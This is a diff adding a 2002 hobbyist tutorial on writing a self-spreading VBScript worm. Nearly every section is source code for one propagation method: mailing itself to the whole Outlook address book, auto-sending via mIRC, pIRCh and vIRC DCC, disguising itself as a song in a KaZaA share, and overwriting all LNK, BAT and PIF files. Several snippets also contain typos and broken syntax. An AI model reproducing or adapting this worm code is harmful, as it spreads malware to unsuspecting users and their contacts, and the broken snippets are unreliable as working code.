@@ -1,0 +1,262 @@
+			Perfect Internet-Worm via VisualBasic Script
+
+Now i wanna show you 8 of the best VBS techniques to spread a worm...
+
+1.) eMail spreading
+2.) mIRC spreading
+3.) pIRCh spreading
+4.) vIRC spreading
+5.) KaZaA spreading
+6.) LNK dropping
+7.) BAT dropping
+8.) PIF dropping
+
+*************************************************************************************************
+1.) eMail spreading
+
+
+First you'll find the eMail-spreading-source:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+Dim x 
+on error resume next 
+Set fso ="Scripting.FileSystem.Object" 
+Set so=CreateObject(fso) 
+Set ol=CreateObject("Outlook.Application") 
+Set out= WScript.CreateObject("Outlook.Application") 
+Set mapi = out.GetNameSpace("MAPI") 
+Set a = mapi.AddressLists(1) 
+For x=1 To a.AddressEntries.Count 
+Set Mail=ol.CreateItem(0) 
+Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
+Mail.Subject="Subject" 
+Mail.Body="Body" 
+Mail.Attachments.Add Wscript.ScriptFullName
+Mail.Send 
+Next 
+ol.Quit 
+
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+The Virus searchs for every email adress in the addressbook. Then sending itself to these addresses.
+It's really easy, I think.
+
+
+*************************************************************************************************
+2.) mIRC spreading
+
+The source first:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+Dim mirc
+set fso=CreateObject("Scripting.FileSystemObject")
+set mirc=fso.CreateTextFile("C:\mirc\script.ini")
+fso.CopyFile Wscript.ScriptFullName, "C:\mirc\attachment.vbs", True
+mirc.WriteLine "[script]"
+mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\attachment.vbs }
+mirc.Close
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+First The virus copies itself to C:\mirc\attachment.vbs
+Then it canges the mIRC-script.ini file. So every user in the same chatroom gets an infect file.
+
+
+
+*************************************************************************************************
+3.) pIRCh spreading
+
+Source:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+
+Dim pirch
+set fso=CreateObject("Scripting.FileSystemObject")
+set mirc=fso.CreateTextFile("C:\pirch98\events.ini")
+fso.CopyFile Wscript.ScriptFullName, "C:\mirc\attachment.vbs", True
+pirch.WriteLine "[Levels]");
+pirch.WriteLine "Enabled=1");
+pirch.WriteLine "Count=6");
+pirch.WriteLine "Level1=000-Unknows"
+pirch.WriteLine "000-UnknowsEnabled=1"
+pirch.WriteLine "Level2=100-Level 100"
+pirch.WriteLine "100-Level 100Enabled=1"
+pirch.WriteLine "Level3=200-Level 200"
+pirch.WriteLine "200-Level 200Enabled=1"
+pirch.WriteLine "Level4=300-Level 300"
+pirch.WriteLine "300-Level 300Enabled=1"
+pirch.WriteLine "Level5=400-Level 400"
+pirch.WriteLine "400-Level 400Enabled=1"
+pirch.WriteLine "Level6=500-Level 500"
+pirch.WriteLine "500-Level 500Enabled=1"
+pirch.WriteLine "[000-Unknowns]"
+pirch.WriteLine "User1=*!*@*"
+pirch.WriteLine "UserCount=1"
+pirch.WriteLine "Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\attachement.vbs"
+pirch.WriteLine "EventCount=1"
+pirch.WriteLine "[100-Level 100]"
+pirch.WriteLine "UserCount=0"
+pirch.WriteLine "EventCount=0"
+pirch.WriteLine "[200-Level 200]"
+pirch.WriteLine "UserCount=0"
+pirch.WriteLine "EventCount=0"
+pirch.WriteLine "[300-Level 300]"
+pirch.WriteLine "UserCount=0"
+pirch.WriteLine "EventCount=0"
+pirch.WriteLine "[400-Level 400]"
+pirch.WriteLine "UserCount=0"
+pirch.WriteLine "EventCount=0"
+pirch.WriteLine "[500-Level 500]"
+pirch.WriteLine "UserCount=0"
+pirch.WriteLine "EventCount=0"
+pirch.Close
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+It's the same as mIRC spreading. First the worm made a copy of itself in the pIRCh direction (C:\pirch98),
+then changes the event.ini file, so every user get an infect file.
+
+
+
+*************************************************************************************************
+4.) vIRC spreading
+
+VBS vIRC source:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+set fso=CreateObject("Scripting.FileSystemObject")
+fso.CopyFile Wscript.ScriptFullName, "C:\Virc\attachment.vbs", True
+set shell=CreateObject("WScript.Shell")
+shell RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\attachment.vbs"
+
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+It's a really short code. First you need a copy of the virus, than change a registry key.
+That's all...
+
+
+
+*************************************************************************************************
+5.) KaZaA spreading
+
+Source:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+
+set fso=CreateObject("Scripting.FileSystemObject")
+fso.CopyFile Wscript.ScriptFullName, "C:\Kazaa\Nirvana - You Know You Are Right.vbs", True
+set shell=CreateObject("WScript.Shell")
+
+shell.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\Kazaa");
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+You make a copy of the virus in the C:\Kazaa-direction.
+Then make a registry-key. Every file in the direction (here it is "C:\kazaa\") other user can download.
+I think, you will understand it.
+
+
+
+*************************************************************************************************
+6.) LNK dropping
+
+
+Dropping means, that every LNK file opens the virus. Look at the code:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+Dim shell, msc, batch, fso
+set fso=CreateObject("Scripting.FileSystemObject")
+fso.CopyFile Wscript.ScriptFullName, "C:\vbs.vbs", True
+set shell=wscript.createobject("wscript.shell")
+set msc=shell.CreateShortCut("C:\vbs.lnk")
+msc.TargetPath=shell.ExpandEnvironment("C:\vbs.vbs")
+msc.WindowStyle=4
+msc.Save
+set batch=fso.CreateTextFile("C:\lnk.bat")
+batch.WriteLine "cls"
+batch.WriteLine "@echo off"
+batch.WriteLine "for %%a in (*.lnk ..\*.lnk \*.lnk %path%\*.lnk %tmp%\*.lnk %temp%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%a"
+batch.Close
+shell.Run  "C:\lnk.bat"
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+First the virus makes a copy of itself to C:\vbs.vbs
+Then it generates a LNK file, which opens the C:\vbs.vbs-file.
+Then the virus makes a batch file, which copies the LNK-file to every LNK file it can find.
+
+
+
+*************************************************************************************************
+7.) BAT dropping
+
+Source first:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+Dim shell, batcha, batchb, fso
+set fso=CreateObject("Scripting.FileSystemObject")
+fso.CopyFile Wscript.ScriptFullName, "C:\vbs.vbs", True
+set batcha=fso.CreateTextFile("C:\bat.bat")
+batcha.WriteLine "cls"
+batcha.WriteLine "@echo off"
+batcha.WriteLine "cscript C:\vbs.vbs"
+batcha.Close
+set batchb=CreateTextFile("C:\bata.bat")
+batchb.WriteLine "cls"
+batchb.WriteLine "@echo off"
+batchb.WriteLine "for %%a in (*.bat ..\*.bat \*.bat %path%\*.bat %tmp%\*.bat %temp%\*.bat %windir%\*.bat) do copy C:\bat.bat %%a"
+batchb.Close
+shell.Run  "C:\lnk.bat"
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+First the virus copies itself to C:\vbs.vbs. Than it generates a batch-file (C:\bat.bat) which opens the virus-copy.
+Than te virus generates a second batch file, which copies the first one to every batch-files it can find.
+
+
+
+
+*************************************************************************************************
+8.) PIF dropping
+
+PIF files open DOS-files. Yes, but VBS is a windows file?? what to do?
+Source:
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+Dim shell, msc, batch, fso, batchb
+set fso=CreateObject("Scripting.FileSystemObject")
+fso.CopyFile Wscript.ScriptFullName, "C:\vbs.vbs", True
+set batch=CreateTextFile("C:\bat.bat")
+batch.WriteLine "cls"
+batch.WriteLine "@echo off"
+batch.WriteLine "cscript C:\vbs.vbs"
+batch.Close
+set shell=wscript.createobject("wscript.shell")
+set msc=shell.CreateShortCut("C:\pif.lnk")
+msc.TargetPath=shell.ExpandEnvironment("C:\bat.bat")
+msc.WindowStyle=4
+msc.Save
+set batchb=CreaateTextFile("C:\pif.bat")
+batchb.WriteLine "cls"
+batchb.WriteLine "@echo off"
+batchb.WriteLine "for %%a in (*.pif ..\*.pif \*.pif %path%\*.pif %tmp%\*.pif %temp%\*.pif %windir%\*.pif) do copy C:\pif.pif %%a"
+batchb.Close
+shell.Run  "C:\pif.bat"
+
++ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+
+First the virus copies itself to C:\vbs.vbs. Than it generates a batch file, which opens the virus.
+Than it generates a PIF file, which opens the batch file. You can see, that the code should generates a LNK,
+but VBS "know" that BAT is a DOS file, so it makes a DOS-ShourtCut, and that's PIF.
+Ok, go on, the vbs file generates a second BAT file, which copies the PIF to every PIF-file, it can find.
+
+
+*************************************************************************************************
+
+Before starting writing this article, i don't really like to program in VBS, because I thought, it's a ScriptKiddy language.
+But after a while I liked it more and more, because I'm able to make really nice things like file-dropping or other stuff.
+I hope U also enjoyed reading this tutorial about VisualBasicScript.
+
+
+
+- - - - - - - - - - -
+SeCoNd PaRt To HeLl
+www.spth.de.vu
+spth@jet2web.cc
+written on 12.11.2002
+- - - - - - - - - - -
